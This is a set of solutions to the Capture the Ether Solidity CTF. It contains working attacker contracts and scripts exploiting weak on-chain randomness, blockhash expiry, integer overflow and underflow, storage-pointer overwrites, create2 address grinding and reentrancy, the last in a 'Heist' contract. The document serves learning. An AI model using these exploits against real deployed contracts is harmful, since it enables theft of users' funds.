# capture-the-ether-ctf-solutions

For most of these, I used Nader's excellent tutorial for a React + Ethers app and only provide the App.js contents:

[The Complete Guide to Full Stack Ethereum Development](https://dev.to/dabit3/the-complete-guide-to-full-stack-ethereum-development-3j13) 

## Solutions

<details>
    <summary>👋 Choose a Nickname</summary>

```javascript
import './App.css';
import { useState } from 'react';
import { ethers } from 'ethers'
import CaptureTheEther from './artifacts/contracts/CaptureTheEther.sol/CaptureTheEther.json'
 
const abi = [
 "function setNickname(bytes32 nickname)",
];
 
const challengeAddress = "..."
 
function App() {
 const [nickname, setNicknameValue] = useState()
 
 // request access to the user's MetaMask account
 async function requestAccount() {
   await window.ethereum.request({ method: 'eth_requestAccounts' });
 }
 
 // call the smart contract, send an update
 async function setNickname() {
   if (!nickname) return
   if (typeof window.ethereum !== 'undefined') {
     await requestAccount()
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner()
     const contract = new ethers.Contract(challengeAddress, abi, signer)
 
     const nicknameAsBytes32 = ethers.utils.formatBytes32String(nickname);
     console.log("Nickname is ", nickname, " and as bytes32: ", nicknameAsBytes32);
 
     const transaction = await contract.setNickname(
       nicknameAsBytes32,
       {
         gasLimit: 1500000
       })
 
     await transaction.wait()
   }
 }
 
 return (
   <div className="App">
     <header className="App-header">
       <button onClick={setNickname}>Set Nickname</button>
       <input onChange={e => setNicknameValue(e.target.value)} placeholder="Set nickname" />
     </header>
   </div>
 );
}
 
export default App;
```

</details>

<details>
    <summary>✌️ Guess the number</summary>

```javascript
import './App.css';
import { useState } from 'react';
import { ethers } from 'ethers'
 
const abi = [
 "function guess(uint8 n) public payable",
];
 
const challengeAddress = "..."
 
function App() {
 // request access to the user's MetaMask account
 async function requestAccount() {
   await window.ethereum.request({ method: 'eth_requestAccounts' });
 }
 
 async function guess() {
   if (typeof window.ethereum !== 'undefined') {
     await requestAccount()
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner()
     const contract = new ethers.Contract(challengeAddress, abi, signer)
 
     const transaction = await contract.guess(42,
       {
         gasLimit: 1500000,
         value: ethers.utils.parseEther('1')
       })
 
     await transaction.wait()
   }
 }
 
 return (
   <div className="App">
     <header className="App-header">
       <button onClick={guess}>Guess 42</button>
     </header>
   </div>
 );
}
 
export default App;
```

</details>

<details>
    <summary>🤫 Guess the secret number</summary>

I didn't save the Javascript for this one, but the key insight is that the answer is only a `uint8`. So just do something like this:

```python
for i in xrange(255):
    if keccak256(i) == 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365:
        print(i)
        break
```

</details>

<details>
    <summary>🎲 Guess the random number</summary>

Look up the contract address in etherscan and look at the state change during the contract creation. The expected answer is going to be there in plain sight.

</details>

<details>
    <summary>💁‍♀️ Guess the new number</summary>
The number is now generated on demand, so we can't avoid writing some code. Just compute exactly the answer it expects and send it to the challenge contract, we don't even need to know what it is:

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface GuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract Guesser {
    constructor() payable {}

    receive() payable external {}
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function pullTheTrigger() public {
        GuessTheNewNumberChallenge instance = GuessTheNewNumberChallenge(address(...));
        uint8 answer = uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))[31]);
        instance.guess{value: 1 ether}(answer);
    }
}
```

</details>

<details>
    <summary>🔮 Predict the future</summary>

We can exploit the fact that there are only 10 possible answers, so we can choose anything we want. And to avoid wasting ether, we use `require` to only send the transaction in a block that produces the right answer.

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface GuessTheNewNumberChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract Guesser {
    GuessTheNewNumberChallenge instance = GuessTheNewNumberChallenge(address(...));
    uint8 expectedAnswer = 2;

    constructor() payable {}

    receive() payable external {}
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function lockInGuess() public {
        instance.lockInGuess{value: 1 ether}(expectedAnswer);
    }
    
    function pullTheTrigger() public {
        uint8 answer = uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))[31]) % 10;
        
        // going to keep hitting this until we find a happy block
        require(answer == expectedAnswer);
        
        instance.settle();
    }
}
```

</details>

<details>
    <summary>🍳 Guess the block hash</summary>

Relevant [Solidity docs](https://docs.soliditylang.org/en/v0.8.6/units-and-global-variables.html?highlight=blockhash#block-and-transaction-properties):

`blockhash(uint blockNumber) returns (bytes32)`: hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero

We can exploit that by guessing that the blockhash will become 0 in the future. Exactly 256 blocks in the future in fact 😅

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface GuessTheNewNumberChallenge {
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
}

contract Guesser {
    GuessTheNewNumberChallenge instance = GuessTheNewNumberChallenge(address(...));

    constructor() payable {}

    receive() payable external {}
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function lockInGuess() public {
        instance.lockInGuess{value: 1 ether}(0);
    }
    
    function pullTheTrigger() public {
        // wait for 256 blocks and then the blockhash of the settlement block will magically become 0 :)
        instance.settle();
    }
}

```

</details>

<details>
    <summary>🛍️ Token sale</summary>
Ping me if you know an analytical solution. I wasn't sure so I went with this python program to find the smallest value that causes an overflow:

```python
def requiredValueWei(numTokens):
 return (numTokens * 10**18) % 2**256
 
def causesOverflow(numTokens):
   return requiredValueWei(numTokens) < numTokens * 10**18
 
def formattedHex(num):
   return '0x' + hex(num)[2:].zfill(64)
 
def bisect(lower_bound, higher_bound):
   print(f'looking for smallest overflow candidate in [{formattedHex(lower_bound)}..{formattedHex(higher_bound)}]')
   candidate = (lower_bound + higher_bound) // 2
   if candidate in [lower_bound, higher_bound]:
       return higher_bound
  
   else:
       if causesOverflow(candidate):
           return bisect(lower_bound, candidate)
      
       else:
           return bisect(candidate, higher_bound)

i = 0
while True:
   numTokens = 2**i
   print(f'trying {hex(numTokens)}')
   if causesOverflow(numTokens):
       break
   i += 1
  
print('First power of 2 that causes an overflow:', i)
print(f'buying {numTokens} tokens would "only" require {requiredValueWei(numTokens)} wei')
 
numTokens = bisect(2**(i-1), 2**i)
print(f'buying {numTokens} tokens would "only" require {requiredValueWei(numTokens)} wei')
```

After that we can just:

```javascript
instance.buy{value: 415992086870360064 wei}(0x0000000000000012725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f22);
instance.sell(1);
```

</details>


<details>
    <summary>🐳 Token whale</summary>

Deploy this approver contract and call `approveMe()`:

```javascript
pragma solidity >=0.7.0 <0.9.0;

interface TokenWhale {
    function approve(address spender, uint256 value) external;
}

contract Approver {
    TokenWhale instance;

    constructor(address theAddress) payable {
        instance = TokenWhale(theAddress);
    }

    receive() payable external {}
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function approveMe() public {
        instance.approve(msg.sender, 1000000);
    }
}
```

Then:

- transfer 1000 tokens to the Approver contract 
- we now have a balance of 0, so call `transferFrom(Approver, Approver, 1)`
- _transfer is dumb and will actually remove 1 token from `msg.sender` (aka us), underflowing us and giving us 0xffff..ffff tokens 🙌


</details>


<details>
    <summary>👴 Retirement fund</summary>

Just force some eth into the contract with a self destruct contract as described in [Mastering Ethereum](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#unexpected-ether).

</details>


<details>
    <summary>🗺️ Mapping</summary>

Write a value at key 0, notice where the state was changed in etherscan.

In my case the value was written at address `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`
so we compute the overflow key as:

```python
key = int('0x' + 'ff' * 32, 16) - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1
```

Just set that key to 1 and you've overridden the `isComplete` boolean


</details>


<details>
    <summary>🙏 Donation</summary>

The Donation object is initially created as a storage pointer, so the value amount actually overwrites the owner field.

Just need to pass an appropriate amount of wei in order to become the owner (`address / 10**36`).

</details>


<details>
    <summary>📆 Fifty years</summary>

This one gave me a ton of grief 😅 It's easy to end up in a state where the contributions are so messed up that it becomes difficult or impossible to recover the funds.

Two key insights:

- `require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);` can be overflowed, so we can create a tx with a giant `unlockTimestamp` and then the next (overflowed) one has an `unlockTimestamp` in the past (so we can withdraw it and everything else before it)

- like in the previous challenge, new Contributions are initialized as a storage pointer, so they stomp the queue (with the amount of the contibution) and the head values (with the `unlockTimestamp`).

Step by step:

- upsert(1, N) 1 wei (should set length=2, head=N) (where N = 0xff..ff - 2 day + 1 = 115792089237316195423570985008687907853269984665640564039457584007913129467136)
- upsert(2, M) 2 wei (should set length=3, head=M) where M = 0xff..ff - 1 day + 1 = 115792089237316195423570985008687907853269984665640564039457584007913129553536

⚠️ problem is at this point we've added 3 wei to the balance of the contract, but because it increases length by pushing, that messes up the contribution amount by 1 every time. So by the time it computes the total, it wants to send 1 eth and 5 wei, which causes a revert because the contract only has 1 eth and 3 wei
✅ solution: we just need to pad with another "fake" contribution where we add 2 wei, but we don't want to withdraw it. It's just so that the total balance of the contract is sufficient!

- upsert(3, 0) 2 wei (should set length=3 (wrong but ok), head=0)
- withdraw(2) -> should properly be able to grab everything from head=0 to length=3 and give us the money

</details>

<details>
    <summary>🛂 Fuzzy identity</summary>

Using the create2 opcode, we can control a bit more the address of the generated contracts, so given that this is the contract that we want to deploy:

```solidity
contract MyNameIsSmarx {
    function name() external pure returns (bytes32) {
        return bytes32("smarx");
    }
    
    function pullTheTrigger() public {
        FuzzyIdentityChallenge instance = FuzzyIdentityChallenge(address(...));
        instance.authenticate();
    }
}
```

Compile it and note its bytecode. 
Then deploy a deployer contract and note its address:

```solidity
contract SmarxDeployer {
    event FoundOne(address);
    
    function deploySmarx(bytes memory code, uint256 salt) public returns(address) {
        address addr;
        assembly {
          addr := create2(0, add(code, 0x20), mload(code), salt)
          if iszero(extcodesize(addr)) {
            revert(0, 0)
          }
        }
        
        emit FoundOne(addr);
        return addr;
    }
}
```

Then we run [create2.py](https://github.com/karmacoma-eth/yolo-evm#create2py):

```shell
python3 create2.py <deployer_addr> 'lambda addr: "badc0de" in addr.lower()' <mynameissmarx_bytecode>
```

until it finds a salt value that will generate a MyNameIsSmarx contract with an address that contains `badc0de`.


</details>

<details>
    <summary>🔑 Public key</summary>

We got to get the r, s and v values from the signature of this transaction:
https://ropsten.etherscan.io/tx/0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb

From r, s, and v we should be able to recover the public key of the account.

```javascript
import './App.css';
import { useState } from 'react';
import { ethers } from 'ethers'
 
 
const abi = [
 "function authenticate(bytes publicKey) public",
];
 
const challengeAddress = "..."
 
function App() {
 async function requestAccount() {
   await window.ethereum.request({ method: 'eth_requestAccounts' });
 }
 
 async function pullTheTrigger() {
   if (typeof window.ethereum !== 'undefined') {
     await requestAccount()
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner()
 
     // from https://ropsten.etherscan.io/getRawTx?tx=0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb
     const tx = ethers.utils.parseTransaction('0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962')
    
     // code to recover the public key from https://ethereum.stackexchange.com/questions/78815/ethers-js-recover-public-key-from-contract-deployment-via-v-r-s-values
     const expandedSig = {
       r: tx.r,
       s: tx.s,
       v: tx.v
     };
    
     const signature = ethers.utils.joinSignature(expandedSig)
     const txData = {
       gasPrice: tx.gasPrice,
       gasLimit: tx.gasLimit,
       value: tx.value,
       nonce: tx.nonce,
       data: tx.data,
       chainId: tx.chainId,
       to: tx.to // you might need to include this if it's a regular tx and not simply a contract deployment
     }
 
     const rsTx = await ethers.utils.resolveProperties(txData)
     const raw = ethers.utils.serializeTransaction(rsTx) // returns RLP encoded tx
     const msgHash = ethers.utils.keccak256(raw) // as specified by ECDSA
     const msgBytes = ethers.utils.arrayify(msgHash) // create binary hash
     const recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes, signature)
 
     // recoveredPubKey is uncompressed, so starts with 0x04
     const compressedPubKey = ethers.utils.arrayify(recoveredPubKey).slice(1)
     const contract = new ethers.Contract(challengeAddress, abi, signer)
    
     // we need to submit the compressedPubKey, otherwise the hash won't match on the smart contract side
     await contract.authenticate(compressedPubKey, {gasLimit: 1500000})
   }
 }
 
 return (
   <div className="App">
     <header className="App-header">
       <button onClick={pullTheTrigger}>Pull the trigger</button>
     </header>
   </div>
 );
}
 
export default App;
```

</details>

<details>
    <summary>⏳ Account takeover</summary>

Haven't figured out this one yet 😔

</details>

<details>
    <summary>🧠 Assume ownership</summary>

Like in the Ethernaut challenge, what looks like a constructor is actually a public function, so just call it to become the owner.

</details>

<details>
    <summary>🏦 Token Bank</summary>

1. Withdraw the tokens from the bank
2. Transfer them to the Heist contract
3. the Heist contract deposits them to the bank
4. the Heist contract withdraws them, but exploits re-entrancy in withdraw

```solidity
contract Heist {
    TokenBankChallenge bank = TokenBankChallenge(...);
    SimpleERC223Token token = SimpleERC223Token(...);
    bool firstTime = true;

    function deposit() public {
        token.transfer(bank, token.balanceOf(this));
    }

    function withdraw() public {
        // we're going to reentrancy the heck out of this
        bank.withdraw(500000 * 10**18);
    }
    
    function tokenFallback(address from, uint256 value, bytes) public {
        if (from != address(bank)) {
            return;
        }
        
        if (!firstTime) {
            return;
        }
        
        firstTime = false;
        withdraw();
    }
    
    function drain() public {
        token.transfer(msg.sender, token.balanceOf(this));
    }
}
```

</details>